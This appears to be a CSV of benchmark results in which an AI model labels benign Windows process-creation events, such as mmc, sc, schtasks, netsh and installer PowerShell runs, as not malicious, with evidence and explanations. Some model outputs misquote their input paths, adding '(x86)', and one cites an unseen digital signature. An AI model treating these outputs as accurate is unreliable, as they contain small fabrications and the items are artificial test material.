+The event shows a legitimate system process (rundll32.exe) executing a standard Windows shell function (SHCreateLocalServerRunDll) initiated by svchost.exe, which is typical for DCOM activation. There are no suspicious command lines, network connections, or unusual parent-child process relationships that would indicate malicious activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-mmc-c-windows-system32-compmgmt-msc.csv,,,processed,NO,100.0,100.0,YES,1,"mmc.exe, ServerManager.exe",SIGMA\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\compmgmt.msc"" /s, ""C:\Windows\system32\ServerManager.exe""",,,0.0,3.04,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: mmc.exe, ServerManager.exe
+- Accounts: SIGMA\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\compmgmt.msc"" /s, ""C:\Windows\system32\ServerManager.exe"" 
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the legitimate Microsoft Management Console (mmc.exe) being launched by ServerManager.exe to open Computer Management (compmgmt.msc). This is a standard administrative activity performed by the Administrator account and does not exhibit characteristics of malicious behavior such as process injection, suspicious command lines, or unauthorized access."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-mmc-c-windows-system32-dsa-msc.csv,,,processed,NO,100.0,100.0,YES,1,"mmc.exe, ServerManager.exe",SIGMA\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\dsa.msc"" , ""C:\Windows\system32\ServerManager.exe""",,,0.0,2.86,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: mmc.exe, ServerManager.exe
+- Accounts: SIGMA\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\dsa.msc"" , ""C:\Windows\system32\ServerManager.exe"" 
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the Administrator launching the Active Directory Users and Computers console (dsa.msc) via the Microsoft Management Console (mmc.exe) from Server Manager. This is a routine administrative task for managing directory services and does not indicate malicious activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-mmc-c-windows-system32-gpmc-msc.csv,,,processed,NO,100.0,100.0,YES,1,"mmc.exe, ServerManager.exe",SIGMA\Administrator,"""C:\Windows\system32\mmc.exe"" C:\Windows\system32\gpmc.msc, ""C:\Windows\system32\ServerManager.exe""",,,0.0,2.87,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: mmc.exe, ServerManager.exe
+- Accounts: SIGMA\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" C:\Windows\system32\gpmc.msc, ""C:\Windows\system32\ServerManager.exe"" 
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the Microsoft Management Console (mmc.exe) being launched by ServerManager.exe to open the Group Policy Management Console (gpmc.msc). This is a standard administrative task performed by the built-in Administrator account and does not indicate malicious activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-mmc-c-windows-system32-gpme-msc.csv,,,processed,NO,100.0,100.0,YES,1,mmc.exe,SIGMA\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\System32\gpme.msc"" /s /gpobject:""LDAP://WIN-FPV0DSIC9O6.sigma.fr/cn={31B2F340-016D-11D2-945F-00C04FB984F9},cn=policies,cn=system,DC=sigma,DC=fr""",,,0.0,3.76,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: mmc.exe
+- Accounts: SIGMA\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\System32\gpme.msc"" /s /gpobject:""LDAP://WIN-FPV0DSIC9O6.sigma.fr/cn={31B2F340-016D-11D2-945F-00C04FB984F9},cn=policies,cn=system,DC=sigma,DC=fr""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the Microsoft Management Console (mmc.exe) being launched by the Administrator to edit a Group Policy Object, which is a standard administrative task. There are no indicators of malicious behavior, such as suspicious command lines, unauthorized access, or unusual process chains, making this routine system administration activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-rundll32-d.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations, C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule",,,0.0,3.48,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations, C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows `rundll32.exe` executing a standard Windows maintenance task (`PerformAutochkOperations`) via `acproxy.dll`, triggered by the legitimate `svchost.exe` service host. This activity is initiated by the `NT AUTHORITY\SYSTEM` account and represents routine system maintenance rather than malicious behavior."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-gpupdate-force.csv,,,processed,NO,100.0,100.0,YES,1,"gpupdate.exe, cmd.exe",SIGMA\Administrator,"gpupdate  /force, ""C:\Windows\system32\cmd.exe""",,,0.0,2.59,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: gpupdate.exe, cmd.exe
+- Accounts: SIGMA\Administrator
+- Commands: gpupdate  /force, ""C:\Windows\system32\cmd.exe"" 
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the execution of `gpupdate.exe` with the `/force` flag, which is a standard administrative command used to refresh Group Policy settings. This activity is initiated by the Administrator account via `cmd.exe`, representing routine system maintenance rather than malicious behavior."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-regsvr32-c-program.csv,,,processed,NO,100.0,100.0,YES,1,regsvr32.exe,DESKTOP-A8CALR3\user,"/s ""C:\Program Files\Notepad++\NppShell_06.dll""",,,0.0,2.81,6.0,5.0,4.0,1,16.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: regsvr32.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: /s ""C:\Program Files (x86)\Notepad++\NppShell_06.dll""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the legitimate system binary regsvr32.exe registering a DLL associated with the installed application Notepad++. This is a routine software installation or update activity and does not exhibit characteristics of malicious execution such as remote script retrieval or suspicious process lineage."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-schtasks-create.csv,,,processed,NO,100.0,100.0,YES,1,"schtasks.exe, target.tmp",DESKTOP-A8CALR3\user,"""C:\Windows\system32\schtasks.exe"" /Create /TN ""klcp_update"" /XML ""C:\Users\user\AppData\Local\Temp\is-LSRFQ.tmp\klcp_update_task.xml"" /F, ""C:\Users\user\AppData\Local\Temp\is-GLVF6.tmp\target.tmp"" /SL5=""$1006E0,49873775,402432,C:\Users\user\AppData\Local\Temp\75D097~2\target.exe"" /verysilent /norestart /LoadInf=""C:\Users\user\AppData\Local\Temp\75D097~2\klcp_full_unattended.ini""",,,0.0,5.08,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: schtasks.exe, target.tmp
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: ""C:\Windows\system32\schtasks.exe"" /Create /TN ""klcp_update"" /XML ""C:\Users\user\AppData\Local\Temp\is-LSRFQ.tmp\klcp_update_task.xml"" /F, ""C:\Users\user\AppData\Local\Temp\is-GLVF6.tmp\target.tmp"" /SL5=""$1006E0,49873775,402432,C:\Users\user\AppData\Local\Temp\75D097~2\target.exe"" /verysilent /norestart /LoadInf=""C:\Users\user\AppData\Local\Temp\75D097~2\klcp_full_unattended.ini""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The activity involves the creation of a scheduled task named ""klcp_update"" by an installer process (target.tmp) using schtasks.exe. The command line arguments reference ""klcp_full_unattended.ini"" and ""klcp_update_task.xml"", which are characteristic of the K-Lite Codec Pack installer, a legitimate software package. This appears to be routine software installation behavior rather than malicious activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-netsh-advfirewall.csv,,,processed,NO,100.0,100.0,YES,1,"netsh.exe, Dropbox.exe",DESKTOP-A8CALR3\user,"C:\Windows\system32\netsh.exe advfirewall firewall delete rule name=Dropbox, ""C:\Program Files\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files\Dropbox\Client"" /KillEveryone:YES /DBData:",,,0.0,3.73,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: netsh.exe, Dropbox.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: C:\Windows\system32\netsh.exe advfirewall firewall delete rule name=Dropbox, ""C:\Program Files (x86)\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files (x86)\Dropbox\Client"" /KillEveryone:YES /DBData:
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The activity involves the legitimate Dropbox application (Dropbox.exe) executing a standard network configuration command (netsh.exe) to remove a specific firewall rule during an installation or update process. This is typical behavior for software that requires specific network permissions and does not indicate malicious intent or unauthorized access."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-regsvr32-n.csv,,,processed,NO,100.0,87.5,YES,1,"regsvr32.exe, DropboxExt64.52.0.dll",DESKTOP-A8CALR3\user,"/S /n /i:\""hklm_reg\"" ""C:\Program Files\Dropbox\Client\DropboxExt64.52.0.dll"", C:\Windows\SysWOW64\regsvr32.exe /S /n /i:\""hklm_reg\"" ""C:\Program Files\Dropbox\Client\DropboxExt64.52.0.dll""",,,16.7,3.90,5.2,6.0,3.3,2,16.5,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: regsvr32.exe, DropboxExt64.52.0.dll
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: /S /n /i:\""hklm_reg\"" ""C:\Program Files (x86)\Dropbox\Client\DropboxExt64.52.0.dll"", C:\Windows\SysWOW64\regsvr32.exe /S /n /i:\""hklm_reg\"" ""C:\Program Files (x86)\Dropbox\Client\DropboxExt64.52.0.dll""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the legitimate Dropbox application registering its shell extension DLL using the standard Windows utility regsvr32.exe. This is routine software installation or update behavior, as the file path, digital signature, and command line arguments are consistent with normal Dropbox client operations."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-sc-delete.csv,,,processed,NO,100.0,100.0,YES,1,"sc.exe, Dropbox.exe",DESKTOP-A8CALR3\user,"C:\Windows\System32\sc.exe delete DbxSvc, ""C:\Program Files\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files\Dropbox\Client"" /KillEveryone:YES /DBData:",,,0.0,3.51,6.0,5.0,4.0,1,16.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: sc.exe, Dropbox.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: C:\Windows\System32\sc.exe delete DbxSvc, ""C:\Program Files (x86)\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files (x86)\Dropbox\Client"" /KillEveryone:YES /DBData:
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The activity shows the legitimate Dropbox application (Dropbox.exe) executing a service control command to delete its own service (DbxSvc) during an installation or update process. This is a standard maintenance operation for the software and does not indicate malicious behavior or unauthorized access."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-sc-create.csv,,,processed,NO,100.0,100.0,YES,1,"sc.exe, Dropbox.exe",DESKTOP-A8CALR3\user,"C:\Windows\System32\sc.exe create DbxSvc binPath=C:\Windows\System32\DbxSvc.exe start=auto, ""C:\Program Files\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files\Dropbox\Client"" /KillEveryone:YES /DBData:",,,0.0,3.80,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: sc.exe, Dropbox.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: C:\Windows\System32\sc.exe create DbxSvc binPath=C:\Windows\System32\DbxSvc.exe start=auto, ""C:\Program Files (x86)\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files (x86)\Dropbox\Client"" /KillEveryone:YES /DBData:
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The activity shows Dropbox software being installed or updated, which legitimately creates a service (DbxSvc) using the standard Service Control Manager tool (sc.exe). The parent process is the legitimate Dropbox installer, and the command line arguments are consistent with a standard software installation routine rather than malicious persistence or privilege escalation."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-sc-failure.csv,,,processed,NO,100.0,100.0,YES,1,"sc.exe, Dropbox.exe",DESKTOP-A8CALR3\user,"C:\Windows\System32\sc.exe failure DbxSvc reset= 3600 actions= restart/5000/restart/30000//, ""C:\Program Files\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files\Dropbox\Client"" /KillEveryone:YES /DBData:",,,0.0,3.85,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: sc.exe, Dropbox.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: C:\Windows\System32\sc.exe failure DbxSvc reset= 3600 actions= restart/5000/restart/30000//, ""C:\Program Files (x86)\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files (x86)\Dropbox\Client"" /KillEveryone:YES /DBData:
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The activity shows Dropbox software performing a standard installation or update process, which involves configuring service recovery options for its own service (DbxSvc) using the legitimate system utility sc.exe. This is routine software maintenance behavior and does not indicate malicious intent or unauthorized access."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-powershell-get-appxpackage.csv,,,processed,NO,100.0,100.0,YES,1,"powershell.exe, Dropbox.exe",DESKTOP-A8CALR3\user,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell ""Get-AppxPackage C27EB4BA.DropboxOEM | Remove-AppxPackage"", ""C:\Program Files\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files\Dropbox\Client"" /KillEveryone:YES /DBData:",,,0.0,3.87,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: powershell.exe, Dropbox.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: C:\Windows\System32\WindowsPowerShell\v1.0\powershell ""Get-AppxPackage C27EB4BA.DropboxOEM | Remove-AppxPackage"", ""C:\Program Files (x86)\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files (x86)\Dropbox\Client"" /KillEveryone:YES /DBData:
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The activity shows Dropbox's installer process executing a PowerShell command to remove its own OEM Appx package during a machine-wide installation or update. This is a standard software maintenance operation initiated by a legitimate, signed application (Dropbox.exe) and does not indicate malicious behavior."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-powershell-get-appxprovisionedpackage.csv,,,processed,NO,100.0,100.0,YES,1,"powershell.exe, Dropbox.exe",DESKTOP-A8CALR3\user,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell ""Get-AppxProvisionedPackage -Online | Where-Object DisplayName -In \""C27EB4BA.DropboxOEM\"" | Remove-ProvisionedAppxPackage -Online"", ""C:\Program Files\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files\Dropbox\Client"" /KillEveryone:YES /DBData:",,,0.0,4.24,6.0,6.0,4.0,2,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: powershell.exe, Dropbox.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: C:\Windows\System32\WindowsPowerShell\v1.0\powershell ""Get-AppxProvisionedPackage -Online | Where-Object DisplayName -In \""C27EB4BA.DropboxOEM\"" | Remove-ProvisionedAppxPackage -Online"", ""C:\Program Files (x86)\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files (x86)\Dropbox\Client"" /KillEveryone:YES /DBData:
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The activity shows Dropbox's installer executing a PowerShell command to remove a specific provisioned package (DropboxOEM) during a machine-wide installation process. This is a standard, benign administrative action performed by legitimate software to manage its own installation state and does not indicate malicious behavior."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-sc-start.csv,,,processed,NO,100.0,100.0,YES,1,"sc.exe, svchost.exe","NT AUTHORITY\LOCAL SERVICE, NT AUTHORITY\SYSTEM","C:\Windows\system32\sc.exe start w32time task_started, C:\Windows\system32\svchost.exe -k netsvcs -p",,,0.0,2.99,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: sc.exe, svchost.exe
+- Accounts: NT AUTHORITY\LOCAL SERVICE, NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\sc.exe start w32time task_started, C:\Windows\system32\svchost.exe -k netsvcs -p
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the Service Control Manager (sc.exe) starting the Windows Time service (w32time), which is a standard system maintenance task. The process is initiated by svchost.exe running under the SYSTEM account, indicating legitimate system-level activity rather than malicious user interaction."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-rundll32-c-windows-system32-windows-staterepositoryclient.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\rundll32.exe C:\Windows\system32\Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks, C:\Windows\system32\svchost.exe -k netsvcs -p",,,0.0,3.52,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\rundll32.exe C:\Windows\system32\Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks, C:\Windows\system32\svchost.exe -k netsvcs -p
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows `rundll32.exe` executing a standard Windows maintenance task (`StateRepositoryDoMaintenanceTasks`) initiated by the `svchost.exe` service host. This is a routine system maintenance activity performed by the SYSTEM account and does not exhibit characteristics of malicious behavior such as suspicious command lines or unauthorized access."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-powershell-noprofile.csv,,,processed,NO,100.0,100.0,YES,1,"powershell.exe, Setup32.exe",DESKTOP-A8CALR3\user,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -NonInteractive -WindowStyle Hidden -Command ""&amp | { $isOfficeInstalled = Get-AppxPackage Microsoft.Office.Desktop -allusers | if ($isOfficeInstalled -eq $null) { Out-File -FilePath 'C:\Users\user\AppData\Local\Temp\Centennial.Detection.IsCentennialOfficeInstalled.scratch' -InputObject '0' -Encoding ascii | } else { Out-File -FilePath 'C:\Users\user\AppData\Local\Temp\Centennial.Detection.IsCentennialOfficeInstalled.scratch' -InputObject '1' -Encoding ascii } }"", ""E:\Office\Setup32.exe"" ELEVATED",,,0.0,4.86,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: powershell.exe, Setup32.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -NonInteractive -WindowStyle Hidden -Command ""&amp; { $isOfficeInstalled = Get-AppxPackage Microsoft.Office.Desktop -allusers; if ($isOfficeInstalled -eq $null) { Out-File -FilePath 'C:\Users\user\AppData\Local\Temp\Centennial.Detection.IsCentennialOfficeInstalled.scratch' -InputObject '0' -Encoding ascii; } else { Out-File -FilePath 'C:\Users\user\AppData\Local\Temp\Centennial.Detection.IsCentennialOfficeInstalled.scratch' -InputObject '1' -Encoding ascii } }"", ""E:\Office\Setup32.exe"" ELEVATED
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The activity involves the legitimate Microsoft Office installer (Setup32.exe) executing a PowerShell script to check for the presence of the Office Appx package. This is a standard installation or configuration check routine and does not exhibit malicious behavior such as data exfiltration, persistence mechanisms, or unauthorized access."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-schtasks-delete.csv,,,processed,NO,100.0,100.0,YES,1,"schtasks.exe, Integrator.exe",NT AUTHORITY\SYSTEM,"schtasks.exe /Delete /F /tn ""Microsoft\Office\OfficeBackgroundTaskHandlerLogon"", integrator.exe /U /Extension /Msi /License PRIDName= PackageGUID=""9AC08E99-230B-47e8-9721-4577B7F124EA"" PackageRoot=""C:\Program Files\Microsoft Office\root""",,,0.0,3.66,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: schtasks.exe, Integrator.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: schtasks.exe /Delete /F /tn ""Microsoft\Office\OfficeBackgroundTaskHandlerLogon"", integrator.exe /U /Extension /Msi /License PRIDName= PackageGUID=""9AC08E99-230B-47e8-9721-4577B7F124EA"" PackageRoot=""C:\Program Files (x86)\Microsoft Office\root""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The activity involves Microsoft Office's legitimate integration tool (Integrator.exe) deleting a specific Office background task via schtasks.exe. This is a routine maintenance action performed by the system account to manage Office scheduled tasks, showing no signs of persistence mechanisms or malicious command execution."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-wevtutil-im.csv,,,processed,NO,100.0,75.0,YES,1,"wevtutil.exe, Integrator.exe",NT AUTHORITY\SYSTEM,"wevtutil.exe im ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\wordEtw.man"" /rf:""C:\Program Files\Microsoft Office\root\Office16\wwlib.dll"" /mf:""C:\Program Files\Microsoft Office\root\Office16\wwlib.dll"", integrator.exe /U /Extension /Msi /License PRIDName= PackageGUID=""9AC08E99-230B-47e8-9721-4577B7F124EA"" PackageRoot=""C:\Program Files\Microsoft Office\root""",,,0.0,5.03,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: wevtutil.exe, Integrator.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: wevtutil.exe im ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\wordEtw.man"" /rf:""C:\Program Files (x86)\Microsoft Office\root\Office16\wwlib.dll"" /mf:""C:\Program Files (x86)\Microsoft Office\root\Office16\wwlib.dll"", integrator.exe /U /Extension /Msi /License PRIDName= PackageGUID=""9AC08E99-230B-47e8-9721-4577B7F124EA"" PackageRoot=""C:\Program Files (x86)\Microsoft Office\root""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The activity involves Microsoft Office's Click-to-Run service (Integrator.exe) executing wevtutil.exe to install a legitimate Word Event Trace for Windows (ETW) manifest. This is a standard maintenance operation for Office applications and does not indicate malicious behavior such as log clearing or persistence mechanisms."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-schtasks-change.csv,,,processed,NO,100.0,100.0,YES,1,"schtasks.exe, OfficeClickToRun.exe",NT AUTHORITY\SYSTEM,"schtasks.exe /change /tn ""Microsoft\Office\Office ClickToRun Service Monitor"" /enable, ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service",,,0.0,3.27,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: schtasks.exe, OfficeClickToRun.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: schtasks.exe /change /tn ""Microsoft\Office\Office ClickToRun Service Monitor"" /enable, ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The activity involves the legitimate Microsoft Office Click-to-Run service enabling its own scheduled task via schtasks.exe. This is a standard maintenance operation performed by the OfficeClickToRun.exe process running under the SYSTEM account, which is typical for Office updates and service management. There are no indicators of malicious persistence, unauthorized access, or suspicious command execution."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-powershell-run.csv,,,processed,NO,100.0,100.0,YES,1,"powershell.exe, Code.exe",DESKTOP-A8CALR3\user,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, ""C:\Program Files\Microsoft VS Code\Code.exe"" --ms-enable-electron-run-as-node ""c:\Program Files\Microsoft VS Code\resources\app\out\bootstrap-fork"" --type=ptyHost",,,0.0,3.52,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: powershell.exe, Code.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, ""C:\Program Files\Microsoft VS Code\Code.exe"" --ms-enable-electron-run-as-node ""c:\Program Files\Microsoft VS Code\resources\app\out\bootstrap-fork"" --type=ptyHost
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows PowerShell being launched by Visual Studio Code (Code.exe) with a standard `--type=ptyHost` argument, which is typical behavior for VS Code's integrated terminal or extension host processes. There are no suspicious command-line arguments, network connections, or privilege escalation indicators present in this single event."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-whoami-run.csv,,,processed,NO,100.0,100.0,YES,1,"whoami.exe, powershell.exe",DESKTOP-A8CALR3\user,"""C:\Windows\system32\whoami.exe"", C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,0.0,2.93,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: whoami.exe, powershell.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: ""C:\Windows\system32\whoami.exe"", C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the execution of `whoami.exe` launched by `powershell.exe`, which is a common administrative command used to identify the current user context. There are no indicators of malicious behavior such as suspicious network connections, registry modifications, or privilege escalation chains in this isolated event."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-rundll32-shell32-dll-shcreatelocalserverrundll.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe","DESKTOP-A8CALR3\user, NT AUTHORITY\SYSTEM","C:\Windows\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {9BA05972-F6A8-11CF-A442-00A0C90A8F39} -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p",,,0.0,4.39,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe
+- Accounts: DESKTOP-A8CALR3\user, NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {9BA05972-F6A8-11CF-A442-00A0C90A8F39} -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows `rundll32.exe` executing a standard Windows shell component (`shell32.dll`) with the `SHCreateLocalServerRunDll` function, which is a common legitimate system operation for launching COM objects. The parent process `svchost.exe` running with the `DcomLaunch` service group is also typical for system services, and no suspicious network connections or unusual command lines are present."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-wevtutil-uninstall-manifest.csv,,,processed,NO,100.0,100.0,YES,1,"wevtutil.exe, MsMpEng.exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\wevtutil.exe uninstall-manifest ""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2111.5-0\Microsoft-Antimalware-AMFilter.man""",,,0.0,3.26,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: wevtutil.exe, MsMpEng.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\wevtutil.exe uninstall-manifest ""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2111.5-0\Microsoft-Antimalware-AMFilter.man""
